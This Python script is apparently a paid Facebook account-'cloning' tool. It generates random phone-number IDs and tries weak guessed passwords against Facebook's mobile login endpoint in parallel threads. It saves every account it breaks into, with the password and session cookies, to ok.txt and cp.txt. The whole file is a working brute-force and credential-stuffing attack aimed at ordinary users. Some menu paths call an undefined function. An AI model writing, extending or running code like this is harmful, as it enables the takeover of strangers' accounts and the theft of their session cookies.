#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python num.py')
  
logo = """
\033[1;31m8b    d8 88   88 .dP"Y8 88  88 88  dP 
\033[1;32m88b  d88 88   88 `Ybo." 88  88 88odP  
\033[1;33m88YbdP88 Y8   8P o.`Y8b 888888 88"Yb  
\033[1;34m88 YY 88 `YbodP' 8bodP' 88  88 88  Yb 

╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;45m      [ TOOLS CREATED BY : MUSHK MAAN]     \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;93m--------------------------------------------------
\033[1;31m [+] GITHUB        : MUSHK
\033[1;37m [+] Author         : MUSHK MAAN
\033[1;34m [+] FACEBOOK  : SINDHI
\033[1;33m [+] WHATSAPP : Not Available 
\033[1;35m [+] Version        : 1.1
\033[1;36m [+] Status           : Paid
\033[1;93m--------------------------------------------------
"""
loop = 0
ok = []
cp = []
def main():
	os.system("clear")
	print(logo)
	print(47*'\033[92;1m-')
	print(" \x1b[1;95m[1] \x1b[1;95mStart Cloning")
	print(" \x1b[1;96m[2] \x1b[1;96mOwner Contact  ")
	print(" \x1b[1;97m[3] \x1b[1;97mJoin Facebook   ")
	print(" \x1b[1;98m[0] \x1b[1;92mExit")
	print(47*'\033[92;1m-')
	HAMZA_select()

def HAMZA_select():
	HAMZA = input('\n\x1b[1;93m[+] Choose Option: \x1b[1;92m')
	if HAMZA == '':
		print("\x1b[1;91mFill in correctly")
		main()
	elif HAMZA == '1':
		HAMZA_TRICKER()
	elif HAMZA == '2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100090820333912&mibextid=ZbWKwL')
		main()
	elif HAMZA == '3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100090820333912&mibextid=ZbWKwL')
		main()
	elif HAMZA == '0':
		os.system('exit')
	else:
		print ('\x1b[1;91m[!] Please select a valid option')
		time.sleep(2)
		main()

   
def HAMZA_TRICKER():
	os.system('clear')
	print(logo)
	os.system('xdg-open https://www.facebook.com/profile.php?id=100090820333912&mibextid=ZbWKwL')
	print('\x1b[1;92m[1]\x1b[1;93m Random UID Cloning')
	print('\x1b[1;92m[0]\x1b[1;94m Back')
	print(47*'\033[92;1m-')
	print ("")
	opt = input('\x1b[1;93m[+] Choose option: \x1b[1;92m')
	if opt =='1':
		method()
	elif opt =='0':
		main()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		HAMZA_KING()
		
def method():
	os.system('clear')
	print(logo)
	os.system('xdg-open https://www.facebook.com/profile.php?id=100090820333912&mibextid=ZbWKwL')
	print('\x1b[1;92m[1]\x1b[1;93m Method1  \x1b[1;92m[Ok idz] \x1b[1;93m[BEST]')
	print('\x1b[1;92m[2]\x1b[1;94m Method2  \x1b[1;92m[Ok idz]')
	print('\x1b[1;92m[0]\x1b[1;95m Back')
	print(47*'\033[92;1m-')
	print ("")
	opt = input('\x1b[1;93m[+] Choose option: \x1b[1;92m')
	if opt =='1':
		method1()
	elif opt =='2':
		method2()
	elif opt =='0':
		HAMZA_KING()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		method()

def method1():
	user=[]
	os.system('clear');print(logo)
	print('\033[1;32m[+] For Example :\033[1;33m 0300,0302,0304,0309 ...')
	print ("")
	kode = input('\033[1;32m[+] Choose Code : \033[1;33m')
	print ("")
	print('\033[1;32m[+] For Example :\033[1;33m 5000,6000,10000 ...')
	print ("")
	limit = int(input('\033[1;32m[+] Idz Limit : \033[1;33m'))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[1;32m Total ids: '+tl)
		print("\033[92;1m Brute Has Been Started \x1b[0m")
		print("\033[92;1m To Stop Process Press CTRL + Z\033[93;1m")
		print(50*'\033[92;1m-')
		print(" [\033[1;92m\033[1;41m  Use Airplane mode For Speed up Cloning  \033[0m\033[1;93m]")
		print(50*'\033[92;1m-')
		print ("")
		for guru in user:
			uid = kode+guru
			pwx = [guru,uid,'khan123','khan12345']
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*'\033[92;1m-')
	print ("")
	print('The process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(54*'_')
	input('\033[1;32m Press enter to back ')
	HAMZA_TRICKER()
	
def mcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cp
	global ok
	global agents
	try:
		for ps in pwx:
			agents = ['Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/310.0.0.50.118;FBPN/com.facebook.mlite;FBLC/pl_PL;FBBV/282018877;FBCR/lifecell;FBMF/samsung;FBBD/samsung;FBDV/MMB29K;FBSV/4.4.4;null;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]','[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/282418109;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]']
			session = requests.Session()
			sys.stdout.write(f'\r \x1b[1;92m[MUSHK] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
			pro = random.choice(agents)
			free_fb = session.get('https://x.facebook.com/?tbua=1').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'x.facebook.com',
			'method':'GET',
		    'path': '/',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}

			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;92m[MUSHK-OK] '+cid+' | '+ps+'\33[0;97m')
				print("\033[1;92m[•] Cookie: "+coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;93m[MUSHK-CP] '+cid+' | '+ps+'\33[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass

def method2():
	user=[]
	os.system('clear');print(logo)
	print('\033[1;32m[+] For Example :\033[1;33m 92310,92342,92300,92301 ...')
	print ("")
	kode = input('\033[1;32m[+] Choose Code : \033[1;33m')
	print ("")
	print('\033[1;32m[+] For Example :\033[1;33m 5000,6000,10000 ...')
	print ("")
	limit = int(input('\033[1;32m[+] Idz Limit : \033[1;33m'))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[1;32m Total ids: '+tl)
		print("\033[92;1m Brute Has Been Started \x1b[0m")
		print("\033[92;1m To Stop Process Press CTRL + Z\033[93;1m")
		print(50*'\033[92;1m-')
		print(" [\033[1;92m\033[1;41m  Use Airplane mode For Speedup Cloning  \033[0m\033[1;93m]")
		print(50*'\033[92;1m-')
		print ("")
		for guru in user:
			uid = kode+guru
			pwx = [guru,uid,'khan123','khan12345']
			yaari.submit(mbcrack,uid,pwx,tl)
	print(47*'\033[92;1m-')
	print ("")
	print('The process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(54*'_')
	input('\033[1;32m Press enter to back ')
	HAMZA_TRICKER()
	
def mbcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cp
	global ok
	global HAMZA
	try:
		for ps in pwx:
			agents =['Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/310.0.0.50.118;FBPN/com.facebook.mlite;FBLC/pl_PL;FBBV/282018877;FBCR/lifecell;FBMF/samsung;FBBD/samsung;FBDV/MMB29K;FBSV/4.4.4;null;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]','[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/282418109;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]']
			session = requests.Session()
			sys.stdout.write(f'\r \x1b[1;92m[HAMZA] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
			pro = random.choice(agents)
			free_fb = session.get('https://x.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'x.facebook.com',
		    'method':'GET',
		    'path': '/',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',   
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' \033[1;32m[MUSHK-OK] '+cid+' | '+ps+'\033[1;32m')
				print("\033[1;92m[•] Cookie: "+coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' \033[1;33m[MUSHK-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass
	
if __name__=='__main__':
	main()
